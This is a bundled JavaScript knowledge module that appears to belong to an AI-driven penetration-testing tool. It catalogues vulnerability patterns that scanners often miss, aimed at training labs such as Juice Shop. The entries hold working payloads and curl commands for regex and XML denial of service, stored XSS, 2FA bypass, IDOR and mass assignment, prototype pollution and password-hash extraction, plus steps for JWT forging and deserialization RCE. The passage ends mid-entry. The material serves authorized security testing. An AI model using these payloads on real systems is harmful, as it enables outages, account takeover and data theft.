import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/knowledge/missed-vuln-training-knowledge.ts
function buildMissedVulnContext(opts) {
  let patterns = MISSED_VULN_PATTERNS;
  if (opts?.targetPreset) {
    patterns = patterns.filter((p) => p.applicableLabs.includes(opts.targetPreset));
  }
  if (opts?.categories) {
    patterns = patterns.filter((p) => opts.categories.includes(p.category));
  }
  if (opts?.maxPatterns) {
    patterns = patterns.slice(0, opts.maxPatterns);
  }
  const sections = patterns.map((p) => {
    const payloadExamples = p.testPayloads.slice(0, 2).map(
      (tp) => `  ${tp.method} ${tp.endpoint}: ${tp.description}`
    ).join("\n");
    const toolExamples = p.toolCommands.slice(0, 1).map(
      (tc) => `  ${tc.tool}: ${tc.description}`
    ).join("\n");
    return `### ${p.name} [${p.severity.toUpperCase()}]
Category: ${p.category} | CWE: ${p.cwe.join(", ")} | OWASP: ${p.owasp.join(", ")}
Why typically missed: ${p.whyMissed}
Detection signals: ${p.detectionSignals.join("; ")}
Test payloads:
${payloadExamples}
Tools:
${toolExamples}
Exploitation: ${p.exploitationSteps.slice(0, 3).join(" \u2192 ")}`;
  });
  return `## Commonly Missed Vulnerability Patterns (${patterns.length} patterns)
These vulnerability classes are frequently missed by automated scanners.
When analyzing findings, CHECK if these patterns have been tested:

${sections.join("\n\n")}

**IMPORTANT**: If any of these patterns have NOT been tested against the target,
request targeted scans to cover them. Prioritize by severity (critical > high > medium).`;
}
function buildMissedVulnAttackContext(targetPreset) {
  let patterns = MISSED_VULN_PATTERNS;
  if (targetPreset) {
    patterns = patterns.filter((p) => p.applicableLabs.includes(targetPreset));
  }
  return patterns.map(
    (p) => `- **${p.name}** (${p.severity}): ${p.exploitationSteps[0]} | ATT&CK: ${p.attackTechniques.join(", ")}`
  ).join("\n");
}
function getMissedVulnPayloads(targetPreset) {
  return MISSED_VULN_PATTERNS.filter((p) => p.applicableLabs.includes(targetPreset)).flatMap((p) => p.testPayloads);
}
function getMissedVulnToolCommands(targetPreset) {
  return MISSED_VULN_PATTERNS.filter((p) => p.applicableLabs.includes(targetPreset)).flatMap((p) => p.toolCommands);
}
function getMissedVulnsByCategory(category) {
  return MISSED_VULN_PATTERNS.filter((p) => p.category === category);
}
function getMissedVulnSummary() {
  return MISSED_VULN_PATTERNS.map((p) => ({
    id: p.id,
    name: p.name,
    category: p.category,
    severity: p.severity,
    applicableLabs: p.applicableLabs,
    cwe: p.cwe
  }));
}
var MISSED_VULN_PATTERNS;
var init_missed_vuln_training_knowledge = __esm({
  "server/lib/knowledge/missed-vuln-training-knowledge.ts"() {
    MISSED_VULN_PATTERNS = [
      // ═══ 1. NoSQL DoS ═══════════════════════════════════════════════════════════
      {
        id: "nosql-dos",
        name: "NoSQL Denial of Service",
        category: "dos",
        cwe: ["CWE-400", "CWE-1333"],
        owasp: ["A06:2021"],
        severity: "high",
        whyMissed: "Scanners test NoSQL injection for data extraction but not for DoS payloads like $where with infinite loops or $regex with catastrophic backtracking",
        detectionSignals: [
          "MongoDB or NoSQL database detected in tech stack",
          "API endpoints accepting JSON query parameters",
          "Search or filter functionality",
          "Response time increases with complex queries"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/rest/products/search",
            headers: { "Content-Type": "application/json" },
            body: '{"q": {"$regex": "^(a+)+$"}}',
            description: "Test catastrophic backtracking in $regex operator",
            expectedIndicator: "Response timeout or 5xx error"
          },
          {
            method: "GET",
            endpoint: "/rest/products/search?q[$where]=function(){var+d=new+Date();while(new+Date()-d<2000){};}",
            description: "Test $where clause with CPU-intensive loop",
            expectedIndicator: "Response delay >2 seconds"
          },
          {
            method: "POST",
            endpoint: "/api/Products",
            headers: { "Content-Type": "application/json" },
            body: '{"name": {"$regex": "(a{1,10000}){1,10000}"}}',
            description: "Test nested quantifier regex DoS",
            expectedIndicator: "Server hangs or returns 503"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -o /dev/null -w '%{time_total}' -X POST -H 'Content-Type: application/json' -d '{"q":{"$regex":"^(a+)+$"}}' TARGET/rest/products/search`,
            description: "Measure response time with ReDoS payload",
            parseHint: "If time_total > 5s, likely vulnerable to NoSQL DoS"
          }
        ],
        exploitationSteps: [
          "1. Identify NoSQL-backed endpoints (MongoDB indicators in headers/errors)",
          "2. Send $regex payload with catastrophic backtracking pattern",
          "3. Measure response time \u2014 >5s indicates vulnerability",
          "4. Try $where with CPU-intensive JavaScript function",
          "5. Confirm DoS by sending multiple concurrent requests"
        ],
        applicableLabs: ["juice-shop"],
        attackTechniques: ["T1499.004"],
        impact: "Application denial of service, resource exhaustion affecting all users"
      },
      // ═══ 2. Stored XSS via API ═════════════════════════════════════════════════
      {
        id: "stored-xss-api",
        name: "Stored XSS via Direct API Calls",
        category: "api_abuse",
        cwe: ["CWE-79"],
        owasp: ["A03:2021"],
        severity: "high",
        whyMissed: "Scanners test reflected XSS in browser forms but miss stored XSS injected via direct REST API calls that bypass client-side validation",
        detectionSignals: [
          "REST API endpoints that accept user-generated content",
          "Product reviews, comments, feedback, or profile fields",
          "API accepts HTML/rich text in request body",
          "Client-side sanitization but no server-side sanitization"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/api/Feedbacks",
            headers: { "Content-Type": "application/json" },
            body: '{"UserId": 1, "comment": "<iframe src=\\"javascript:alert(document.cookie)\\">", "rating": 5, "captchaId": 0, "captcha": ""}',
            description: "Inject stored XSS via feedback API bypassing frontend sanitization",
            expectedIndicator: "XSS payload persisted and rendered to other users"
          },
          {
            method: "POST",
            endpoint: "/api/Products",
            headers: { "Content-Type": "application/json" },
            body: '{"name": "test", "description": "<script>alert(1)</script>", "price": 1}',
            description: "Inject stored XSS via product description",
            expectedIndicator: "Script tag persisted in product listing"
          },
          {
            method: "PUT",
            endpoint: "/api/Users/1",
            headers: { "Content-Type": "application/json" },
            body: '{"username": "<img src=x onerror=alert(1)>"}',
            description: "Inject stored XSS via user profile update",
            expectedIndicator: "XSS payload in username displayed on pages"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{"comment":"<iframe src=javascript:alert(1)>","rating":5}' TARGET/api/Feedbacks`,
            description: "Test stored XSS via feedback API",
            parseHint: "Check if response contains unescaped HTML tags"
          },
          {
            tool: "nuclei",
            args: "-u TARGET -t http/vulnerabilities/xss/ -severity high,critical",
            description: "Run nuclei XSS templates against API endpoints",
            parseHint: "Look for 'stored-xss' or 'persistent-xss' matches"
          }
        ],
        exploitationSteps: [
          "1. Enumerate all API endpoints that accept user content (POST/PUT)",
          "2. Send XSS payloads directly via API, bypassing frontend forms",
          "3. Test iframe, img onerror, svg onload, and script tag payloads",
          "4. Verify payload persistence by fetching the resource via GET",
          "5. Check if payload renders unescaped when viewed by other users"
        ],
        applicableLabs: ["juice-shop", "bwapp", "mutillidae"],
        attackTechniques: ["T1189"],
        impact: "Session hijacking, credential theft, account takeover via persistent XSS"
      },
      // ═══ 3. Video XSS ═════════════════════════════════════════════════════════
      {
        id: "video-xss",
        name: "XSS via Video/Media Embedding",
        category: "api_abuse",
        cwe: ["CWE-79"],
        owasp: ["A03:2021"],
        severity: "medium",
        whyMissed: "Scanners don't test media-based XSS vectors like subtitle tracks, video metadata, or embedded media tags in user content",
        detectionSignals: [
          "Application allows video/media embedding or upload",
          "Product pages with embedded media",
          "User-generated content that supports HTML/markdown with media",
          "Subtitle or caption file upload functionality"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/api/Products",
            headers: { "Content-Type": "application/json" },
            body: '{"description": "<video><source onerror=alert(1)></video>"}',
            description: "Inject XSS via video source error handler",
            expectedIndicator: "JavaScript executes when video fails to load"
          },
          {
            method: "POST",
            endpoint: "/api/Products",
            headers: { "Content-Type": "application/json" },
            body: '{"description": "<video src=x onerror=alert(1)>"}',
            description: "Inject XSS via video tag onerror",
            expectedIndicator: "Alert fires on page load"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -X POST -H 'Content-Type: application/json' -d '{"description":"<video src=x onerror=alert(1)>"}' TARGET/api/Products`,
            description: "Test video XSS payload via API",
            parseHint: "Check if video tag with onerror is stored unescaped"
          }
        ],
        exploitationSteps: [
          "1. Find endpoints accepting HTML content (product descriptions, comments)",
          "2. Inject <video>, <audio>, <source> tags with onerror handlers",
          "3. Test subtitle track injection: <track src='data:text/vtt,...'>",
          "4. Verify XSS fires when the page renders the media element"
        ],
        applicableLabs: ["juice-shop"],
        attackTechniques: ["T1189"],
        impact: "Session hijacking via media-based persistent XSS"
      },
      // ═══ 4. Two-Factor Authentication Bypass ═══════════════════════════════════
      {
        id: "2fa-bypass",
        name: "Two-Factor Authentication Bypass",
        category: "auth_bypass",
        cwe: ["CWE-287", "CWE-304"],
        owasp: ["A07:2021"],
        severity: "critical",
        whyMissed: "Scanners detect generic broken auth but don't specifically test 2FA bypass flows like response manipulation, direct endpoint access, or TOTP brute-force",
        detectionSignals: [
          "Application has 2FA/MFA functionality",
          "TOTP setup endpoint exists",
          "2FA verification endpoint in API",
          "QR code generation for authenticator apps"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/rest/2fa/verify",
            headers: { "Content-Type": "application/json" },
            body: '{"tmpToken": "VALID_TMP_TOKEN", "totpToken": "000000"}',
            description: "Brute-force 6-digit TOTP code (000000-999999)",
            expectedIndicator: "Successful auth with guessed TOTP"
          },
          {
            method: "POST",
            endpoint: "/rest/2fa/verify",
            headers: { "Content-Type": "application/json" },
            body: '{"tmpToken": "VALID_TMP_TOKEN", "totpToken": ""}',
            description: "Test empty TOTP bypass",
            expectedIndicator: "Authentication succeeds without valid TOTP"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -X POST -H 'Content-Type: application/json' -d '{"tmpToken":"TOKEN","totpToken":""}' TARGET/rest/2fa/verify`,
            description: "Test empty TOTP bypass",
            parseHint: "Check if response contains auth token without valid TOTP"
          }
        ],
        exploitationSteps: [
          "1. Enable 2FA on a test account, capture the setup flow",
          "2. Login with credentials to get tmpToken",
          "3. Test empty TOTP, '000000', and null values",
          "4. Intercept 2FA verification response, change success:false to success:true",
          "5. Try accessing authenticated endpoints directly with tmpToken (skip 2FA step)",
          "6. Test TOTP brute-force \u2014 check if rate limiting exists on verification endpoint"
        ],
        applicableLabs: ["juice-shop", "webgoat"],
        attackTechniques: ["T1556", "T1111"],
        impact: "Complete authentication bypass, account takeover even with 2FA enabled"
      },
      // ═══ 5. Forged Feedback (User ID Manipulation) ════════════════════════════
      {
        id: "forged-feedback",
        name: "Forged Feedback / User ID Manipulation",
        category: "business_logic",
        cwe: ["CWE-284", "CWE-639"],
        owasp: ["A01:2021"],
        severity: "medium",
        whyMissed: "Scanners don't test user ID manipulation in request bodies \u2014 they focus on URL parameter IDOR but miss body-level identity spoofing",
        detectionSignals: [
          "API endpoints that accept UserId in request body",
          "Feedback, review, or comment submission endpoints",
          "User-associated content creation without server-side identity validation"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/api/Feedbacks",
            headers: { "Content-Type": "application/json" },
            body: '{"UserId": 2, "comment": "Forged as user 2", "rating": 5, "captchaId": 0, "captcha": ""}',
            description: "Submit feedback as a different user by changing UserId",
            expectedIndicator: "Feedback created with UserId 2 while authenticated as user 1"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer USER1_TOKEN' -d '{"UserId":2,"comment":"forged","rating":5}' TARGET/api/Feedbacks`,
            description: "Test user ID manipulation in feedback submission",
            parseHint: "Check if response shows UserId=2 despite authenticating as user 1"
          }
        ],
        exploitationSteps: [
          "1. Authenticate as user A, capture auth token",
          "2. Submit feedback via API with UserId set to user B's ID",
          "3. Verify feedback is attributed to user B",
          "4. Test with admin user ID to impersonate admin"
        ],
        applicableLabs: ["juice-shop"],
        attackTechniques: ["T1134"],
        impact: "Identity spoofing, reputation manipulation, trust exploitation"
      },
      // ═══ 6. Product Tampering (Mass Assignment) ═══════════════════════════════
      {
        id: "product-tampering",
        name: "Product Tampering via Mass Assignment",
        category: "api_abuse",
        cwe: ["CWE-915"],
        owasp: ["A01:2021", "A04:2021"],
        severity: "high",
        whyMissed: "Scanners don't test mass assignment on resource endpoints \u2014 they check read access (IDOR) but not write access to modify product/resource attributes",
        detectionSignals: [
          "REST API with PUT/PATCH endpoints for resources",
          "Product, item, or resource management endpoints",
          "API accepts additional fields beyond what the UI sends"
        ],
        testPayloads: [
          {
            method: "PUT",
            endpoint: "/api/Products/1",
            headers: { "Content-Type": "application/json" },
            body: '{"description": "TAMPERED by attacker", "price": 0.01}',
            description: "Modify product description and price via PUT",
            expectedIndicator: "Product attributes changed without admin privileges"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -X PUT -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{"description":"TAMPERED","price":0.01}' TARGET/api/Products/1`,
            description: "Test product tampering via mass assignment",
            parseHint: "Check if response shows modified product attributes"
          }
        ],
        exploitationSteps: [
          "1. Enumerate product/resource API endpoints",
          "2. Send PUT/PATCH with modified attributes (price, description, status)",
          "3. Check if non-admin user can modify resource attributes",
          "4. Test adding extra fields not in the original form (role, isAdmin, etc.)"
        ],
        applicableLabs: ["juice-shop", "crapi"],
        attackTechniques: ["T1565"],
        impact: "Data integrity compromise, financial fraud via price manipulation"
      },
      // ═══ 7. Basket Manipulation ═══════════════════════════════════════════════
      {
        id: "basket-manipulation",
        name: "Shopping Basket Manipulation",
        category: "business_logic",
        cwe: ["CWE-639"],
        owasp: ["A01:2021"],
        severity: "medium",
        whyMissed: "Scanners test basket viewing IDOR but not basket item manipulation \u2014 adding items to other users' baskets or modifying quantities",
        detectionSignals: [
          "Shopping cart/basket API endpoints",
          "BasketId or cartId parameters in requests",
          "Item addition/modification endpoints"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/api/BasketItems",
            headers: { "Content-Type": "application/json" },
            body: '{"BasketId": 2, "ProductId": 1, "quantity": 100}',
            description: "Add items to another user's basket",
            expectedIndicator: "Item added to basket 2 while owning basket 1"
          },
          {
            method: "PUT",
            endpoint: "/api/BasketItems/1",
            headers: { "Content-Type": "application/json" },
            body: '{"quantity": -5}',
            description: "Set negative quantity for price manipulation",
            expectedIndicator: "Negative quantity accepted, reducing total price"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -X POST -H 'Content-Type: application/json' -H 'Authorization: Bearer TOKEN' -d '{"BasketId":2,"ProductId":1,"quantity":1}' TARGET/api/BasketItems`,
            description: "Test cross-basket item manipulation",
            parseHint: "Check if item is added to basket 2 despite owning basket 1"
          }
        ],
        exploitationSteps: [
          "1. Identify basket/cart API endpoints",
          "2. Create two accounts, note their basket IDs",
          "3. As user A, add items to user B's basket via API",
          "4. Test negative quantities for price manipulation",
          "5. Test adding items to admin's basket"
        ],
        applicableLabs: ["juice-shop"],
        attackTechniques: ["T1565"],
        impact: "Financial fraud, business logic bypass, cross-user data manipulation"
      },
      // ═══ 8. Forged Signed JWT ═════════════════════════════════════════════════
      {
        id: "forged-jwt",
        name: "JWT Secret Cracking and Token Forging",
        category: "crypto_weakness",
        cwe: ["CWE-347", "CWE-326"],
        owasp: ["A02:2021"],
        severity: "critical",
        whyMissed: "Scanners test JWT none algorithm attack but don't attempt to crack weak JWT signing secrets or forge tokens with known/leaked keys",
        detectionSignals: [
          "Application uses JWT for authentication",
          "JWT tokens visible in cookies or Authorization headers",
          "HS256 algorithm used (symmetric key, crackable)",
          "Short or common JWT secrets"
        ],
        testPayloads: [
          {
            method: "GET",
            endpoint: "/rest/user/whoami",
            headers: { "Authorization": "Bearer FORGED_JWT_WITH_ADMIN_ROLE" },
            description: "Access authenticated endpoint with forged JWT",
            expectedIndicator: "Response shows admin user details"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s TARGET/rest/user/whoami -H 'Cookie: token=JWT_TOKEN' | python3 -c 'import sys,json,base64;t=sys.stdin.read();parts=t.split(".");print(base64.b64decode(parts[1]+"=="))'`,
            description: "Decode JWT to check algorithm and claims",
            parseHint: "Look for HS256 algorithm and role/admin claims"
          }
        ],
        exploitationSteps: [
          "1. Capture JWT token from authentication response",
          "2. Decode header to check algorithm (HS256 = crackable)",
          "3. Use jwt_tool or hashcat to crack the signing secret",
          "4. Common weak secrets: 'secret', 'password', app name, etc.",
          "5. Forge new JWT with admin role/elevated privileges",
          "6. Use forged token to access admin endpoints"
        ],
        applicableLabs: ["juice-shop", "webgoat"],
        attackTechniques: ["T1528", "T1134"],
        impact: "Complete authentication bypass, privilege escalation to admin"
      },
      // ═══ 9. Weak Crypto - MD5 Password Hashes ════════════════════════════════
      {
        id: "weak-crypto-md5",
        name: "Weak Cryptographic Hashing (MD5 Passwords)",
        category: "crypto_weakness",
        cwe: ["CWE-328", "CWE-916"],
        owasp: ["A02:2021"],
        severity: "high",
        whyMissed: "Scanners detect password hash exposure but don't analyze the hashing algorithm strength \u2014 MD5 without salt is trivially crackable",
        detectionSignals: [
          "Exposed password hashes in API responses",
          "32-character hex strings in user data",
          "No salt visible alongside hash values",
          "Hash format consistent with MD5 (32 hex chars)"
        ],
        testPayloads: [
          {
            method: "GET",
            endpoint: "/api/Users",
            description: "Access user listing endpoint to find exposed password hashes",
            expectedIndicator: "Response contains 32-char hex strings (MD5 hashes)"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s TARGET/api/Users -H 'Authorization: Bearer TOKEN' | python3 -c 'import sys,json;d=json.load(sys.stdin);[print(u.get("email","?"),u.get("password","?")) for u in d.get("data",d) if isinstance(d,list) or True]'`,
            description: "Extract password hashes from user API",
            parseHint: "32-char hex strings = MD5, check if salted"
          }
        ],
        exploitationSteps: [
          "1. Access user data endpoint to find exposed password hashes",
          "2. Identify hash format \u2014 32 hex chars = likely MD5",
          "3. Check for salt \u2014 if no salt, hashes are trivially crackable",
          "4. Use rainbow tables (crackstation.net) or hashcat for MD5 cracking",
          "5. Use cracked passwords for account takeover"
        ],
        applicableLabs: ["juice-shop"],
        attackTechniques: ["T1110.002"],
        impact: "Mass account compromise via trivially crackable password hashes"
      },
      // ═══ 10. XXE DoS ═════════════════════════════════════════════════════════
      {
        id: "xxe-dos",
        name: "XML External Entity Denial of Service (Billion Laughs)",
        category: "dos",
        cwe: ["CWE-611", "CWE-776"],
        owasp: ["A05:2021"],
        severity: "high",
        whyMissed: "Scanners test XXE for data exfiltration (file:// protocol) but not for DoS via entity expansion (billion laughs) or recursive entity references",
        detectionSignals: [
          "Application accepts XML input (file upload, API, SOAP)",
          "XXE data access already confirmed",
          "XML parser processes DTD declarations"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/api/Products",
            headers: { "Content-Type": "application/xml" },
            body: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><foo>&lol3;</foo>',
            description: "Billion laughs XXE DoS payload",
            expectedIndicator: "Server memory spike or timeout"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -o /dev/null -w '%{time_total}' -X POST -H 'Content-Type: application/xml' -d '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><foo>&lol3;</foo>' TARGET/file-upload`,
            description: "Test billion laughs payload and measure response time",
            parseHint: "If time_total > 10s or connection reset, XXE DoS confirmed"
          }
        ],
        exploitationSteps: [
          "1. Identify XML-accepting endpoints (file upload, API, SOAP)",
          "2. Send billion laughs payload with nested entity expansion",
          "3. Monitor server response time and memory usage",
          "4. Try quadratic blowup variant for servers with entity depth limits"
        ],
        applicableLabs: ["juice-shop", "bwapp", "webgoat"],
        attackTechniques: ["T1499.004"],
        impact: "Application denial of service via memory exhaustion"
      },
      // ═══ 11. Insecure Deserialization ═════════════════════════════════════════
      {
        id: "insecure-deserialization",
        name: "Insecure Deserialization",
        category: "deserialization",
        cwe: ["CWE-502"],
        owasp: ["A08:2021"],
        severity: "critical",
        whyMissed: "Scanners lack serialization payload generation \u2014 detecting insecure deserialization requires crafted payloads specific to the serialization format (JSON, YAML, Java, PHP, Python pickle)",
        detectionSignals: [
          "Base64-encoded data in cookies or request parameters",
          "Serialized objects in request/response bodies",
          "Java/.NET/PHP/Python/Node.js backend detected",
          "Cookie values that decode to object structures",
          "Content-Type: application/x-java-serialized-object"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/api/Products",
            headers: { "Content-Type": "application/json" },
            body: '{"constructor": {"prototype": {"isAdmin": true}}}',
            description: "Test prototype pollution via JSON deserialization",
            expectedIndicator: "Object prototype modified, isAdmin becomes true"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: "-s TARGET/ -H 'Cookie: session=BASE64_PAYLOAD' -v 2>&1 | grep -i 'set-cookie\\|error\\|exception'",
            description: "Test deserialization via modified session cookie",
            parseHint: "Look for error messages revealing serialization library"
          }
        ],
        exploitationSteps: [
          "1. Identify serialized data in cookies, headers, or request bodies",
          "2. Decode and analyze the serialization format",
          "3. For Node.js: test prototype pollution via __proto__ or constructor.prototype",
          "4. For Java: use ysoserial to generate gadget chain payloads",
          "5. For PHP: craft unserialize() exploit payloads",
          "6. For Python: test pickle deserialization with os.system payload"
        ],
        applicableLabs: ["juice-shop", "webgoat", "bwapp"],
        attackTechniques: ["T1059"],
        impact: "Remote code execution, privilege escalation, data tampering"
      },
      // ═══ 12. Information Disclosure - Error Messages ══════════════════════════
      {
        id: "verbose-errors",
        name: "Information Disclosure via Verbose Error Messages",
        category: "info_disclosure",
        cwe: ["CWE-209"],
        owasp: ["A05:2021"],
        severity: "medium",
        whyMissed: "Scanners find some info disclosure but don't systematically trigger and analyze error messages for stack traces, database details, and internal paths",
        detectionSignals: [
          "Application returns detailed error messages",
          "Stack traces visible in 500 responses",
          "Database connection strings in errors",
          "Internal file paths exposed",
          "Framework/library version information in errors"
        ],
        testPayloads: [
          {
            method: "GET",
            endpoint: "/api/Products/undefined",
            description: "Trigger error with invalid product ID",
            expectedIndicator: "Stack trace or database error in response"
          },
          {
            method: "GET",
            endpoint: "/api/Products/'",
            description: "Trigger SQL error with single quote",
            expectedIndicator: "SQL error message with table/column names"
          },
          {
            method: "POST",
            endpoint: "/api/Users",
            headers: { "Content-Type": "application/json" },
            body: "{}",
            description: "Trigger validation error with empty body",
            expectedIndicator: "Detailed validation error revealing schema"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s TARGET/api/Products/undefined | python3 -c 'import sys;d=sys.stdin.read();print(d[:2000] if "error" in d.lower() or "stack" in d.lower() or "at " in d else "No verbose errors")'`,
            description: "Check for verbose error messages",
            parseHint: "Look for stack traces, file paths, database details"
          }
        ],
        exploitationSteps: [
          "1. Send malformed requests to all API endpoints (invalid IDs, empty bodies, special chars)",
          "2. Analyze error responses for stack traces",
          "3. Extract internal paths, database names, table structures",
          "4. Identify framework versions from error format",
          "5. Use disclosed information to refine further attacks"
        ],
        applicableLabs: ["juice-shop", "dvwa", "bwapp", "mutillidae", "webgoat"],
        attackTechniques: ["T1592"],
        impact: "Internal architecture disclosure enabling targeted attacks"
      },
      // ═══ 13. Deprecated Interface ═════════════════════════════════════════════
      {
        id: "deprecated-interface",
        name: "Deprecated/Legacy Interface Exploitation",
        category: "info_disclosure",
        cwe: ["CWE-477"],
        owasp: ["A05:2021"],
        severity: "medium",
        whyMissed: "Scanners enumerate common paths but don't specifically look for deprecated API versions, legacy upload interfaces, or B2B endpoints that bypass modern security controls",
        detectionSignals: [
          "Multiple API versions available (/v1/, /v2/)",
          "Legacy file upload endpoints",
          "B2B or partner integration endpoints",
          "Swagger/OpenAPI docs referencing deprecated endpoints",
          "Old admin panels or management interfaces"
        ],
        testPayloads: [
          {
            method: "GET",
            endpoint: "/api-docs",
            description: "Check for API documentation revealing deprecated endpoints",
            expectedIndicator: "Swagger/OpenAPI listing deprecated routes"
          },
          {
            method: "POST",
            endpoint: "/file-upload",
            headers: { "Content-Type": "application/xml" },
            body: '<?xml version="1.0"?><foo>test</foo>',
            description: "Test deprecated XML file upload interface",
            expectedIndicator: "XML upload accepted (deprecated B2B interface)"
          }
        ],
        toolCommands: [
          {
            tool: "feroxbuster",
            args: "-u TARGET -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 10 --status-codes 200,301,302",
            description: "Enumerate API endpoints including deprecated ones",
            parseHint: "Look for /v1/, /legacy/, /old/, /b2b/, /upload/ paths"
          },
          {
            tool: "nuclei",
            args: "-u TARGET -t http/exposures/ -severity medium,high",
            description: "Scan for exposed interfaces and documentation",
            parseHint: "Look for swagger, api-docs, deprecated endpoint matches"
          }
        ],
        exploitationSteps: [
          "1. Enumerate all API endpoints including versioned paths",
          "2. Check /api-docs, /swagger, /openapi.json for documentation",
          "3. Test deprecated endpoints that may lack modern security controls",
          "4. Try XML upload on file-upload endpoints (B2B interface)",
          "5. Test old API versions for removed security checks"
        ],
        applicableLabs: ["juice-shop"],
        attackTechniques: ["T1190"],
        impact: "Security control bypass via unpatched legacy interfaces"
      },
      // ═══ 14. Outdated Dependencies ════════════════════════════════════════════
      {
        id: "outdated-dependencies",
        name: "Outdated Software Dependencies",
        category: "component_analysis",
        cwe: ["CWE-1104"],
        owasp: ["A06:2021"],
        severity: "medium",
        whyMissed: "Network-level scanners can't perform Software Composition Analysis (SCA) \u2014 detecting outdated dependencies requires access to package manifests or fingerprinting library versions from response patterns",
        detectionSignals: [
          "Exposed package.json or requirements.txt",
          "Library version strings in response headers",
          "Known vulnerable library patterns in JavaScript bundles",
          "Old framework version indicators in error messages"
        ],
        testPayloads: [
          {
            method: "GET",
            endpoint: "/package.json",
            description: "Access exposed package manifest",
            expectedIndicator: "JSON file with dependency versions"
          },
          {
            method: "GET",
            endpoint: "/bower.json",
            description: "Access legacy bower manifest",
            expectedIndicator: "JSON file with frontend dependency versions"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s TARGET/package.json | python3 -c 'import sys,json;d=json.load(sys.stdin);deps={**d.get("dependencies",{}),**d.get("devDependencies",{})};[print(f"{k}: {v}") for k,v in sorted(deps.items())]'`,
            description: "Extract dependency versions from exposed package.json",
            parseHint: "Cross-reference versions with known CVEs"
          },
          {
            tool: "nuclei",
            args: "-u TARGET -t http/technologies/ -severity info,low,medium",
            description: "Fingerprint technology versions",
            parseHint: "Look for version numbers that can be checked against CVE databases"
          }
        ],
        exploitationSteps: [
          "1. Check for exposed package manifests (package.json, composer.json, requirements.txt)",
          "2. Fingerprint library versions from response headers and JS bundles",
          "3. Cross-reference with CVE databases (NVD, Snyk, npm audit)",
          "4. Check for known exploits for identified outdated versions",
          "5. Test specific CVE exploits for confirmed vulnerable versions"
        ],
        applicableLabs: ["juice-shop", "dvwa", "bwapp", "mutillidae", "webgoat"],
        attackTechniques: ["T1190"],
        impact: "Exploitation of known CVEs in outdated libraries"
      },
      // ═══ 15. Vulnerable Library ═══════════════════════════════════════════════
      {
        id: "vulnerable-library",
        name: "Known Vulnerable Library Exploitation",
        category: "component_analysis",
        cwe: ["CWE-1104"],
        owasp: ["A06:2021"],
        severity: "high",
        whyMissed: "Scanners rely on network-level detection and don't perform code-level analysis to identify specific vulnerable library versions and their known CVEs",
        detectionSignals: [
          "Specific library versions identified in package manifest",
          "Known vulnerable patterns in JavaScript bundles",
          "Library-specific error messages or behaviors",
          "Prototype pollution indicators"
        ],
        testPayloads: [
          {
            method: "GET",
            endpoint: "/package.json",
            description: "Access package manifest to identify vulnerable libraries",
            expectedIndicator: "Libraries with known CVEs (e.g., lodash < 4.17.21, sanitize-html < 2.x)"
          },
          {
            method: "POST",
            endpoint: "/api/Products",
            headers: { "Content-Type": "application/json" },
            body: '{"__proto__": {"isAdmin": true}}',
            description: "Test prototype pollution in vulnerable lodash/express",
            expectedIndicator: "Prototype pollution succeeds, isAdmin becomes true"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s TARGET/package.json | python3 -c 'import sys,json;d=json.load(sys.stdin);deps=d.get("dependencies",{});vulns={"sanitize-html":"<2.0","jsonwebtoken":"<9.0","express-jwt":"<6.0","lodash":"<4.17.21"};[print(f"VULNERABLE: {k} {deps[k]}") for k in vulns if k in deps]'`,
            description: "Check for known vulnerable libraries",
            parseHint: "Match library versions against known CVE ranges"
          }
        ],
        exploitationSteps: [
          "1. Identify library versions from package manifest or fingerprinting",
          "2. Check specific libraries: sanitize-html, jsonwebtoken, lodash, express-jwt",
          "3. For sanitize-html < 2.x: test HTML sanitization bypass",
          "4. For lodash < 4.17.21: test prototype pollution",
          "5. For jsonwebtoken < 9.0: test algorithm confusion attacks"
        ],
        applicableLabs: ["juice-shop"],
        attackTechniques: ["T1190"],
        impact: "Exploitation of known CVEs, potentially leading to RCE or data breach"
      },
      // ═══ 16. Zero Stars Feedback (Business Logic Boundary) ════════════════════
      {
        id: "zero-stars-feedback",
        name: "Business Logic Boundary Bypass (Zero Stars)",
        category: "business_logic",
        cwe: ["CWE-20"],
        owasp: ["A04:2021"],
        severity: "low",
        whyMissed: "Scanners don't test business logic boundary conditions \u2014 submitting rating=0 when the UI enforces 1-5 requires intercepting and modifying the request",
        detectionSignals: [
